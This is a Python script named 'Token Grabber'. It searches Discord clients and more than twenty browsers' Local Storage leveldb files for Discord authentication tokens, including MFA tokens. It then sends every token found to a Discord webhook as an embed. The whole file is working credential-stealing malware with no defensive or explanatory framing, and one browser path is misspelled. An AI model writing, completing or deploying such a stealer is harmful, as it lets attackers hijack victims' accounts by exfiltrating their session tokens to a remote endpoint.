import os, re, requests

Webhook = 'webhook_here'

def searchtokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in re.findall(regex, line):
					tokens.append(token)
	return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
    'Discord': roaming + '\\discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Lightcord': roaming + '\\Lightcord',
    'Discord PTB': roaming + '\\discordptb',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
    'Amigo': local + '\\Amigo\\User Data',
    'Torch': local + '\\Torch\\User Data',
    'Kometa': local + '\\Kometa\\User Data',
    'Orbitum': local + '\\Orbitum\\User Data',
    'CentBrowser': local + '\\CentBrowser\\User Data',
    '7Star': local + '\\7Star\\7Star\\User Data',
    'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
    'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': local + '\\Iridium\\User Data\\Default'
}
    r = ''
    for GetData, path in paths.items():
        if not os.path.exists(path):
            continue
        r += f'\n{GetData}\n```'
        tokens = searchtokens(path)
        if len(tokens) > 0:
            for token in tokens:
                r += f'{token}\n'
        else:
            r += '\n'
        r += '```'
    statusEmbed = {
        "embeds": [
            {
                "author": {
                    "name": "Token Grabber",
                },
                "description": r,
                "color": 16119101,
            }
        ]
    }
    requests.post(Webhook, json=statusEmbed)

if __name__ == '__main__':
    main()
